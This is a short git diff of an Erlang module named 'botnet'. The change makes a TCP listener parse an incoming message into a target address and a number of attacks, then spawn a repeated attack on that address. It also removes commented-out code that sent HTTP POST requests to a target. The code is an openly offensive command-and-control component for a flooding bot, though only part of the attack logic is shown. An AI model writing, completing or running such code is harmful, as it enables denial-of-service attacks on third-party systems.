@@ -1,5 +1,5 @@
 -module(botnet).
--export([connectionTestServer/1, do_recv/2, start/2, attackTarget/1, attackTarget/2, connectionTargetServer/1]).
+-export([connectionTestServer/1, do_recv/2, start/2, attackTarget/2, connectionTargetServer/1]).
 
 connectionTestServer(Port) ->
     {ok, LSock} = gen_tcp:listen(Port, [binary, {packet, 0},
@@ -15,18 +15,10 @@ connectionTargetServer(Port) ->
     {ok, Sock} = gen_tcp:accept(LSock),
     {ok, Bin} = do_recv(Sock, []),
     ok = gen_tcp:close(Sock),
-    attackTarget(Bin).
-    % spawn(botnet, attackTarget, [Bin, 3]).
-
-attackTarget(TargetURI) ->
-    TargetURI.
-    % ssl:start(),
-    % application:start(inets),
-    % httpc:request(post,
-    %     {TargetURI, [],
-    %     "application/x-www-form-urlencoded",
-    %     "example=here&foo=bar"
-    %     }, [], []).
+    SplitString = string:tokens(binary_to_list(Bin), " "),
+    NumberofAttacks = list_to_integer(lists:last(SplitString)),
+    Address = lists:last(lists:droplast(SplitString)),
+    spawn(botnet, attackTarget, [Address, NumberofAttacks]).
 
 attackTarget(TargetURI, 0) ->
     done;
